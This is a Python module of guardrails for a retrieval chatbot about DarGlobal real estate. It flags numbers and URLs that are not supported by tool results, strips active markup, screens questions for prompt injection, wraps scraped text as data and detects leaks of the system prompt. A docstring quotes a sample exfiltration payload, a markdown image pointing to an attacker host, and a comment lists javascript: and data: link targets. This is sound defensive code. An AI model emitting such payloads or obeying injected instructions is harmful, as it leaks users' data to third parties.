"""Deterministic answer checks used by the `finalize` node (no LLM call).

1. No invented numbers: every number in the answer must appear in tool-result text or in the user question
   (normalised: commas removed, 2.5M / 4K / "2 million" expanded).
2. Citations: URLs in the answer must come from tool sources; if the answer cites none, sources are appended.
"""
import re

from app import security

_URL = re.compile(r"https?://[^\s)\]>\"']+")
_NUM = re.compile(r"(?<![\w.])(\d{1,3}(?:,\d{3})+|\d+(?:\.\d+)?)\s*(million|billion|bn|mln|m|k)?(?![\w])", re.I)
_LIST_MARKER = re.compile(r"^\s*(?:\d+[.)]|[-*])\s+", re.M)
_MULT = {"k": 1e3, "m": 1e6, "mln": 1e6, "million": 1e6, "bn": 1e9, "billion": 1e9}


def _values(text: str) -> set[float]:
    """All numeric values in `text`, both raw and with multiplier applied."""
    out: set[float] = set()
    text = _URL.sub(" ", text)
    for m in _NUM.finditer(text):
        try:
            v = float(m.group(1).replace(",", ""))
        except ValueError:
            continue
        out.add(round(v, 2))
        if m.group(2):
            out.add(round(v * _MULT[m.group(2).lower()], 2))
    return out


def answer_numbers(answer: str) -> list[tuple[str, float]]:
    """Numbers stated in the answer (URLs and list markers ignored). Value with multiplier applied."""
    text = _LIST_MARKER.sub("", _URL.sub(" ", answer))
    found = []
    for m in _NUM.finditer(text):
        v = float(m.group(1).replace(",", ""))
        if m.group(2):
            v *= _MULT[m.group(2).lower()]
        found.append((m.group(0).strip(), round(v, 2)))
    return found


def unsupported_numbers(answer: str, evidence: list[str], question: str) -> list[str]:
    allowed = _values(question)
    for e in evidence:
        allowed |= _values(e)
    bad = []
    for raw, v in answer_numbers(answer):
        # Numbers 0-10 are allowed: ordinals, "two of them" style counts of shown rows, step numbers.
        if v <= 10 and float(v).is_integer():
            continue
        if v not in allowed:
            bad.append(raw)
    return bad


def cited_urls(answer: str) -> list[str]:
    return [u.rstrip(".,;") for u in _URL.findall(answer)]


def unknown_urls(answer: str, source_urls: set[str]) -> list[str]:
    known = {s.rstrip("/") for s in source_urls}
    return [u for u in cited_urls(answer) if u.rstrip("/") not in known]


_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_BAD_LINK = re.compile(r"\]\(\s*(?!https://)[^)]*\)", re.I)          # [x](javascript:..) / (//evil) / (data:..)
_HTML_TAG = re.compile(r"<\s*/?\s*(img|a|iframe|script|style|svg|object|embed|form|link|meta)\b[^>]*>", re.I)


def strip_active_markup(answer: str) -> tuple[str, int]:
    """Remove markdown images, non-https link targets and raw HTML tags. An image URL is fetched by the user's
    browser on render, so an injected `![](https://attacker/?q=...)` would leak data without a click."""
    n = 0
    for rx, rep in ((_MD_IMAGE, ""), (_MD_BAD_LINK, "]"), (_HTML_TAG, "")):
        answer, k = rx.subn(rep, answer)
        n += k
    return answer, n


def strip_unknown_urls(answer: str, source_urls: set[str]) -> tuple[str, list[str]]:
    """Remove links the tools never returned (hallucinated or injected, e.g. phishing). Returns (answer, removed)."""
    bad = unknown_urls(answer, source_urls)
    for u in sorted(set(bad), key=len, reverse=True):
        answer = answer.replace(u, "[link removed]")
    return answer, bad


# ------------------------------------------------------------------ input / injection guardrails
MAX_QUESTION_CHARS = 1000
INJECTION_REPLY = ("I can only help with questions about DarGlobal projects, the company, its news, "
                   "and the Wasalt listings in my data.")
TOO_LONG_REPLY = f"Please keep your question under {MAX_QUESTION_CHARS} characters."


def check_input(question: str) -> tuple[str, str | None]:
    """Returns (cleaned_question, refusal_or_None). Runs before any LLM call (costs nothing)."""
    q = security.strip_control(question or "").strip()
    if not q:
        return q, "Please type a question."
    if len(q) > MAX_QUESTION_CHARS:
        return q, TOO_LONG_REPLY
    if security.has_injection(q):
        return q, INJECTION_REPLY
    return q, None


def sanitize_tool_text(name: str, text: str, max_chars: int) -> tuple[str, int]:
    """Neutralise instructions hidden in scraped text and wrap it as data. Returns (text, n_neutralised)."""
    text, flags = security.scan_text(text)
    n = flags.get("injection", 0)
    if len(text) > max_chars:
        text = text[:max_chars].rsplit("\n", 1)[0] + "\n[truncated]"
    return f'<tool_data tool="{name}">\n{text}\n</tool_data>', n


def leaks_system_prompt(answer: str, system_prompt: str) -> bool:
    """True if the answer quotes a long verbatim span of the system prompt."""
    a = " ".join(answer.split()).lower()
    lines = [" ".join(l.split()).lower() for l in system_prompt.splitlines() if len(l.strip()) > 60]
    return any(l[:80] in a for l in lines)
